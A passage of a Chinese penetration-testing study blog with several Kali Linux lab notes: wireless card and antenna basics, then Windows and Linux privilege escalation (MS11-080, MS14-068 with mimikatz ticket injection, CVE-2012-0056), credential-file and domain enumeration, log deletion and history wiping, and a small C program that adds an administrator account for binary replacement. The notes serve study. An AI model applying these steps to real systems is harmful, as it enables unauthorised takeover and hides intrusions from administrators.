-<li>但是对无线渗透至关重要</li>
-<li>允许无线网卡没有任何筛选的抓包</li>
-<li>与有线网络的混杂模式可以类比</li>
-<li>适合的网卡和驱动不但可以monitor，更可以Injection</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>默认情况下，会过滤掉802.11包头，需要开启Monitor Mode，才能抓到无线的内容</code></pre></blockquote>
-<h4 id="17-无线网卡准备"><a href="#17-无线网卡准备" class="headerlink" title="17. 无线网卡准备"></a>17. 无线网卡准备</h4><ul>
-<li>物理机运行Kali</li>
-<li>虚拟机运行Kali<ul>
-<li>外置USB无线网卡（把USB网卡映射给虚拟机）</li>
-<li>TL-WAN722N（个人建议）</li>
-<li><strong><code>🔺命令：dmesg -T</code></strong>（时间）（显示操作系统硬件级别的变化）</li>
-<li><strong><code>🔺命令：iwconfig</code></strong>（查看无线网卡）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>无线渗透网卡芯片选择：ATHEROS</code></pre></blockquote>
-<h4 id="18-选择无线网卡"><a href="#18-选择无线网卡" class="headerlink" title="18. 选择无线网卡"></a>18. 选择无线网卡</h4><ul>
-<li>这是个痛苦和受挫的过程</li>
-<li>无线网卡的芯片型号是成败的关键</li>
-<li>台式机<ul>
-<li>USBW无线网卡（不支持扩展天线）</li>
-<li>PCMCIA（16bit 已停产 802.11b）</li>
-<li>Cardbus（32bit PCMCIA 8.0标准）</li>
-<li>Express Cards（小的PCI接口）</li>
-<li>MiniPCI</li>
-<li>MiniPCI Express</li>
-<li>PCI接口卡（可外接天线）</li>
-</ul>
-</li>
-<li>发生功率：远程连接（官方出厂限制为20dbm，可外接天线提高范围）</li>
-<li>接受灵敏性：适当降低灵敏度，接受效果更佳</li>
-<li>经验但不是铁律<ul>
-<li>Atheros或Realtek芯片</li>
-<li>没有神器</li>
-<li>兼容aircrack-ng suite（官网查看兼容的网卡）</li>
-</ul>
-</li>
-<li><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters</a></li>
-<li>无线渗透网卡没有所谓的标准，但是Aircrack-ng suite作者给出建议</li>
-<li>Alfa Network AWUS036H<ul>
-<li>Realtek 8187芯片</li>
-<li>1000mW发生功率</li>
-<li>天线：RP-SMA（可扩展）</li>
-</ul>
-</li>
-</ul>
-<h4 id="19-无线技术概念"><a href="#19-无线技术概念" class="headerlink" title="19. 无线技术概念"></a>19. 无线技术概念</h4><ul>
-<li>分贝dB<ul>
-<li>测量无线信号强度</li>
-</ul>
-</li>
-<li>B：向Alexander Graham Bell致敬<ul>
-<li>今天大部分声学设备的发明者和理论奠基人</li>
-</ul>
-</li>
-<li>dB：表示2个信号之间的差异比率，用于描述设备的信号强度，是一个相对值</li>
-<li>dBm：功率值与1mW进行比较的dB值结果</li>
-</ul>
-<blockquote>
-<pre><code>dB power = 10*log(signal/reference)
-10*log(100mW/1mW)=20dBm</code></pre></blockquote>
-<ul>
-<li>每增加3dB，功率增加约1倍</li>
-<li>每增加10dB，功率值增加10倍</li>
-<li>dBi：全向天线辐射强度（向所有方向，增益）</li>
-<li>dBd：定向天线辐射强度（向固定发向，增大）</li>
-</ul>
-<h4 id="20-dBi"><a href="#20-dBi" class="headerlink" title="20. dBi"></a>20. dBi</h4><ul>
-<li>全向天线的信号功率增益</li>
-<li>增益是指定功率强度增加了多少dB</li>
-<li>300mW的无线路由器，添加了一个9dBi的天线后功率如何变化<ul>
-<li>假设2dBi的电缆和接头耗损</li>
-<li>24.8dBi+9dBi-2dBi=31.8dBi</li>
-<li>换算为mW功率</li>
-<li>10的（31.8dBi/10）次方=10的3.18次方=1513mW</li>
-</ul>
-</li>
-<li>dBm功率相加等于mW功率相乘</li>
-</ul>
-<h4 id="21-dBd"><a href="#21-dBd" class="headerlink" title="21. dBd"></a>21. dBd</h4><ul>
-<li>dBd是定向天香的增益值</li>
-<li>全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号</li>
-<li>天线增益越大信号传输距离越远</li>
-<li>既然有mW来表示功率为什么还要引入dB这个单位？<ul>
-<li>接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W，mW来计算非常不便，而dBm通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达的功率的变化，因此无线和声学系统都采用了dB这个单位</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>定向天线好处：1.传输范围比较集中，传的更远;2.更安全，防止被破解</code></pre></blockquote>
-<h4 id="22-全向天线"><a href="#22-全向天线" class="headerlink" title="22. 全向天线"></a>22. 全向天线</h4><ul>
-<li>全向天线波形图<ul>
-<li>甜甜圈</li>
-</ul>
-</li>
-<li>天线选择的误区<ul>
-<li>增益越高越好（国家严格限制无线通信带宽，打击伪基站）</li>
-<li>高功耗</li>
-<li>对周围环境的信号干扰</li>
-</ul>
-</li>
-<li>增益过高的全向天线会变成定向天线</li>
-</ul>
-<blockquote>
-<pre><code>5dBi与9dBi全向对比：越往上，范围越奇怪（特别是Vertical方向）</code></pre></blockquote>
-<h4 id="23-定向天线"><a href="#23-定向天线" class="headerlink" title="23. 定向天线"></a>23. 定向天线</h4><ul>
-<li><strong>双四边形</strong><ul>
-<li>定向发送信号</li>
-<li>功率相同时，比全向天线传输距离更远（方向正确的情况下）</li>
-</ul>
-</li>
-<li><strong>八木天线：引向发射天线</strong></li>
-<li><strong>平面天线</strong></li>
-<li><strong>扇形天线</strong><ul>
-<li>常用于移动电话网络</li>
-<li>3到4个扇形天线联合使用可实现全向信号覆盖</li>
-<li>90度扇形天线</li>
-</ul>
-</li>
-<li><strong>120度扇形天线</strong></li>
-<li><strong>网状天线</strong><ul>
-<li>射束带宽更加集中，功率更强，最远距离更远</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(三十一)：漏洞提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
-                2019-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-MS11-080"><a href="#1-MS11-080" class="headerlink" title="1. MS11-080"></a>1. MS11-080</h4><ul>
-<li>MS11-080（提权漏洞）<ul>
-<li><strong><code>🔺命令：searchploit MS11-080</code></strong></li>
-<li><strong><code>🔺命令：cp /usr/share/exploitdb/exploits/windows/local/18176.py</code></strong>（针对32位英文版操作系统）</li>
-<li><strong><code>🔺命令：cp 18176.py C:/Python2.7</code></strong></li>
-</ul>
-</li>
-<li>Kb2592799<ul>
-<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>查看升级的补丁：运行 → appwiz.cpl → show updates → remove</code></pre></blockquote>
-<ul>
-<li>Pywin32<ul>
-<li><a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/" target="_blank" rel="noopener">http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/</a></li>
-</ul>
-</li>
-<li>Pyinstaller（文件夹需要放到Python目录下,18176.c需要放到Pyinstaller文件夹中）<ul>
-<li><a href="https://pypi.org/project/PyInstaller/2.1/#files" target="_blank" rel="noopener">https://pypi.org/project/PyInstaller/2.1/#files</a></li>
-<li><strong><code>🔺命令：..\python pyinstaller.py --onefile 18176.py</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：18176.exe -O XP</code></strong></li>
-<li><strong><code>🔺命令：net localgroup administartor a /add</code></strong>（增加本地账号到管理员组）</li>
-</ul>
-<h4 id="2-MS11-046（拒绝服务）"><a href="#2-MS11-046（拒绝服务）" class="headerlink" title="2. MS11-046（拒绝服务）"></a>2. MS11-046（拒绝服务）</h4><ul>
-<li>Dos</li>
-</ul>
-<blockquote>
-<pre><code>公司若通过域环境管理电脑，统一分配软件和权限，一般安全性很高
-在没有安装python环境的机子，可将脚本编译成exe文件（需要Pyinstaller、Pywin32）</code></pre></blockquote>
-<h4 id="3-MS14-068"><a href="#3-MS14-068" class="headerlink" title="3. MS14-068"></a>3. MS14-068</h4><ul>
-<li>MS14-068（远程漏洞利用）</li>
-</ul>
-<blockquote>
-<pre><code>Windows XP系统利用不成
-Windows 7系统利用成功 lab\u1 penbox\w7</code></pre></blockquote>
-<ul>
-<li>库<ul>
-<li><a href="https://github.com/mubix/pykek（ms14-068.py）" target="_blank" rel="noopener">https://github.com/mubix/pykek（ms14-068.py）</a></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：searchexploit ms14-068</code></strong></li>
-<li>/usr/share/exploitdb/platforms/windows/remote/35474.py</li>
-<li><strong><code>🔺命令：python 35474.py/ms14-068.py -u user@lab.com -s userSID -d dc.lab.com</code></strong> ▲2019.12.22 35473.py/ms14-068.py脚本报错（域控制名称，如果不在域中，只能输入域控制器的IP地址）<ul>
-<li>会生成一个TGT文件票据（包含普通用户提升到管理员账号）</li>
-</ul>
-</li>
-<li>输入u1的密码</li>
-<li>拷贝<a href="mailto:TGT_user1@lab.com.ccache" target="_blank" rel="noopener">TGT_user1@lab.com.ccache</a>到提权windows系统</li>
-<li>本地管理系统<ul>
-<li><strong><code>🔺命令：minikatz.exe log &quot;kerberos::ptc TGT user@lab.com.ccache&quot; exit</code></strong></li>
-<li>访问管理共享：<strong><code>🔺命令：net use\\完整的域控制器名称\admin$</code></strong></li>
-<li>访问域控制器C盘：运行 → \完整的域控制器名称\c$</li>
-<li>打开修改注册表：regedit → 连接网络注册表 → 域控制器IP地址 → 账号：<a href="mailto:user1@lab.com" target="_blank" rel="noopener">user1@lab.com</a> 密码</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>域管理：安全边界（有一台计算机作为管理机，可通过一台机器管理所有域内的机器）
-服务器升级为域服务器的时候，会自动把Administartor升级为域服务器管理机
-搭建域控制器Windows Server2003：
-1.配置静态IP地址，DNS服务器指向自己
-2.运行域程序的安装：dcpromo（安装过程需要光盘）
-3.DNS全名：lab.com
-4.分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）
-5.加入域的计算机，在lab.com，Computer可以管理加入域的机器，需要Administrator登陆域接收器关闭防火墙
-6.管理加入域的机器，删除域接受器本地的账号，在域接收器本地的Administrator组中加入一个新的u1域的账号，检查名称，u1具有域接收器本地管理员权限，不对其他域机器有管理员权限（可以不设置，为了后面实验）
-搭建域接受器Windows XP：
-1.准备 → 关闭防火墙 → 配置静态IP地址（DNS指向域控制器）
-2.我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）
-3.共享资源\\lab.com
-5.获取SID： 通过whoami /all 查看域的SID
-6.net view：查看域控制器完整名称</code></pre></blockquote>
-<h4 id="4-CVE-2012-0056"><a href="#4-CVE-2012-0056" class="headerlink" title="4. CVE-2012-0056"></a>4. CVE-2012-0056</h4><ul>
-<li>Ubuntu11.10<ul>
-<li><a href="http://old-releases.ubuntu.com/releases/11.10" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10</a></li>
-<li><strong><code>🔺命令：searchexploit 18411.c</code></strong>（Kali上）</li>
-<li>Linux之间拷贝文件: <strong><code>🔺命令：SCP 文件 账号@IP地址：存放路径</code></strong>（通过SSH隧道，Kali端）</li>
-</ul>
-</li>
-<li>gcc（exploit-db/searchexploit都有存在EXP） <ul>
-<li><strong><code>🔺命令：mount /dev/cdrom /media/cdrom</code></strong>（挂载CD光盘设备）</li>
-<li><strong><code>🔺命令：sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</code></strong>（ubuntu停止安装更新源）</li>
-<li><strong><code>🔺命令：sudo apt-get install openssh-server</code></strong></li>
-<li><strong><code>🔺命令：gcc 18411.c -o exp</code></strong></li>
-</ul>
-</li>
-<li>CVE-2012-0056（操作系统内核对用户进程控制权限不严格）<ul>
-<li>/proc/pid/mem</li>
-<li>kernels&lt;=2.6.39</li>
-<li><a href="http://blog.zx2c4.com/749（漏洞详细原理）" target="_blank" rel="noopener">http://blog.zx2c4.com/749（漏洞详细原理）</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>/proc目录：内存中生成的临时/proc，保存了内存的实时数据，每生成一个进程，对应分配的PID，都会在这里创建一个目录
-Ubuntu下：id查看当前用户信息
-#：root用户提示符；$：普通用户提示符</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%89)%EF%BC%9A%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF%E4%B8%8E%E9%9A%90%E8%94%BD%E7%97%95%E8%BF%B9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%89)%EF%BC%9A%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF%E4%B8%8E%E9%9A%90%E8%94%BD%E7%97%95%E8%BF%B9/" itemprop="url">Kali Linux笔记(三十三)：收集信息与隐蔽痕迹</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
-                2019-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  800 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><ul>
-<li>应用系统的配置文件<ul>
-<li>应用连接数据库的配置文件</li>
-<li>后台服务运行账户</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-基本信息收集"><a href="#2-基本信息收集" class="headerlink" title="2. 基本信息收集"></a>2. 基本信息收集</h4><ul>
-<li>Linux<ul>
-<li>/etc/resolv.conf（DNS信息）</li>
-<li>/etc/passwd（存了用户账号和密码）</li>
-<li>/etc/shadow（存放的密码信息）</li>
-<li><strong><code>🔺命令：whoami,who -a</code></strong></li>
-<li><strong><code>🔺命令：ifconfig -a，iptables -L -n，netstat -rn</code></strong></li>
-<li><strong><code>🔺命令：uname -a，ps aux</code></strong></li>
-<li><strong><code>🔺命令：dpkg -l | head</code></strong>（rc–remove+配置文件保存）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>/etc/passwd   -rw-r--r--
-/etc/shadow   -rw-r-----</code></pre></blockquote>
-<ul>
-<li>Windows<ul>
-<li><strong><code>🔺命令：ipconfig /all,ipconfig /displaydns（DNS缓存）,netstat -bnao,netstat -r（查询路由）</code></strong></li>
-<li><strong><code>🔺命令：net view,net view /domain（网络共享信息）</code></strong></li>
-<li><strong><code>🔺命令：net user /domain,net user %username% /domain</code></strong>（域环境的信息）</li>
-<li><strong><code>🔺命令：net accounts,net share</code></strong>（机器开的共享）</li>
-<li><strong><code>🔺命令：net localgroup administrator username /add</code></strong>（加入管理员组）</li>
-<li><strong><code>🔺命令：net group &quot;Domain Controllers&quot; /domain</code></strong>（查看域控制器的主机账号）</li>
-<li><strong><code>🔺命令：net share name$=C:\ /unlimited</code></strong>（域控制器的共享）</li>
-<li><strong><code>🔺命令：net user username /active:yes /domain</code></strong>（域管理员启动锁定的账号）</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-WMIC（WINDOWS-MANAGEMENT-INSTRUMENTATION）"><a href="#3-WMIC（WINDOWS-MANAGEMENT-INSTRUMENTATION）" class="headerlink" title="3. WMIC（WINDOWS MANAGEMENT INSTRUMENTATION）"></a>3. WMIC（WINDOWS MANAGEMENT INSTRUMENTATION）</h4><ul>
-<li><strong><code>🔺命令：wmic nicconfig get ipaddress,macaddress</code></strong>（读取IP地址，MAC地址）</li>
-<li><strong><code>🔺命令：wmic computersystem get username</code></strong>（当前登陆用户账号）</li>
-<li><strong><code>🔺命令：wmic netlogin get name,lastcalclogon</code></strong>（查看用户登陆记录，通过网络login）</li>
-<li><strong><code>🔺命令：wmic process get caption,executablepath,commandline</code></strong>（查看当前进程信息，由哪些命令执行，执行程序的路径）</li>
-<li><strong><code>🔺命令：wmic process where name=&quot;calc.exe&quot; call terminate</code></strong>（结束一个进程）</li>
-<li><strong><code>🔺命令：wmic os get name,servicepackmajorversion</code></strong>（提取操作系统版本，补丁）</li>
-<li><strong><code>🔺命令：wmic product get name,version</code></strong>（查看当前操作系统安装的软件）</li>
-<li><strong><code>🔺命令：wmic product where name=&quot;name&quot; call uninstall /nointeractive</code></strong>（删除软件，静默的去删除）</li>
-<li><strong><code>🔺命令：wmic share get /ALL</code></strong>（查看共享文件夹）</li>
-<li><strong><code>🔺命令：wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;</code></strong>（开启远程桌面） ▲ 2019.12.21 Win10的RPC服务器不可用，可在系统属性 → 远程中开启远程协助</li>
-<li><strong><code>🔺命令：wmic nteventlog get</code></strong> path,filename,writeable（查看当前系统日志对应操作系统文件）</li>
-</ul>
-<blockquote>
-<pre><code>查看操作系统日志：运行 → eventvwr</code></pre></blockquote>
-<h4 id="5-收集敏感信息"><a href="#5-收集敏感信息" class="headerlink" title="5. 收集敏感信息"></a>5. 收集敏感信息</h4><ul>
-<li>商业信息</li>
-<li>系统信息</li>
-<li>Linux<ul>
-<li>/etc；/usr/local/etc</li>
-<li>/etc/passwd；/etc/shadow</li>
-<li>.ssh；.gnupg 公私钥（默认隐藏文件）</li>
-<li>The e-mail and data files</li>
-<li>业务数据库：身份认证服务数据库</li>
-<li>/tmp</li>
-</ul>
-</li>
-<li>Windows<ul>
-<li>SAM数据库；注册表文件</li>
-<li>%SYSTEMROOT%\repair\SAM（SAM数据库备份）</li>
-<li>%SYSTEMROOT%\System32\config\RegBack\SAM（SAM数据库备份）</li>
-<li>业务数据库：身份认证数据库</li>
-<li>临时文件目录<ul>
-<li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-隐藏痕迹"><a href="#6-隐藏痕迹" class="headerlink" title="6. 隐藏痕迹"></a>6. 隐藏痕迹</h4><ul>
-<li>Windows<ul>
-<li>禁止在登陆界面显示新建账号</li>
-<li><strong><code>🔺命令：REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindosNT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v uname（要隐藏的账号名）/T REG_DWORD /D 0</code></strong> ▲ 2019.12.21 Win10命令可以执行，但未禁止</li>
-<li>del %WINDIR%*.log /a/s/q/f（强制安静不留痕迹删除）</li>
-</ul>
-</li>
-<li>Linux<ul>
-<li><strong><code>🔺命令：history</code></strong>（重点关注，查看曾经运行的命令）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>   history -c（擦除history之前的命令）<br>   lsattr（查看权限相关文件的属性）</p>
-<ul>
-<li>rm .bash_history &amp;&amp; chattr +i .bash_history（文件名）（文件不能再写入）</li>
-</ul>
-</blockquote>
-<blockquote>
-<pre><code>history存在内存中，关机即删除
-.bash_history存在硬盘，关机不删除</code></pre></blockquote>
-<ul>
-<li>日志（/var/log）<ul>
-<li>auth.log/secure</li>
-<li>btmp/wtmp（数据文件，不能直接查看，通过<strong><code>🔺命令：lastb/last</code></strong>查看文件）</li>
-<li><strong><code>🔺命令：lastlog/faillog</code></strong></li>
-</ul>
-</li>
-<li>其他日志和HIDS等 </li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(三十二)：配置不当提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
-                2019-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  274 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-利用配置不当提权"><a href="#1-利用配置不当提权" class="headerlink" title="1. 利用配置不当提权"></a>1. 利用配置不当提权</h4><ul>
-<li>与漏洞提权相比更常用的方法<ul>
-<li>企业环境</li>
-<li>补丁更新的全部已经安装（有一定的安装策略）</li>
-<li>输入变量过滤之外更值得研发关注的安全隐患</li>
-<li>以system权限启动（查看system权限执行的服务）</li>
-<li>NTFS权限允许users修改删除</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-利用配置不当提权"><a href="#2-利用配置不当提权" class="headerlink" title="2. 利用配置不当提权"></a>2. 利用配置不当提权</h4><ul>
-<li>icacls<ul>
-<li>icacls 文件（查看文件NTFS权限）</li>
-<li><strong><code>🔺命令：icacls c:\windows\*.exe /save perm（文件名） /T</code></strong>（所有满足条件的文件）</li>
-<li><strong><code>🔺命令：i686-w64-mingw32-gcc -o admin.exe admin.c</code></strong></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int i;</span><br><span class="line">  i=system(&quot;net localgroup administrators a add/&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<pre><code>BU：基本用户（若存在权限为FA，即为所要找的文件）
-PU：普通用户
-BA：管理员账户</code></pre></blockquote>
-<ul>
-<li>Window2 2003<ul>
-<li><strong><code>🔺命令：net user a /add</code></strong></li>
-<li><strong><code>🔺命令：net user a</code></strong></li>
-<li>CamView添加user完全控制文件</li>
-<li>拷贝到admin.exe到软件运行目录下，修改名称为原来执行文件的名称</li>
-<li>删除原来执行文件或者改名</li>
-</ul>
-</li>
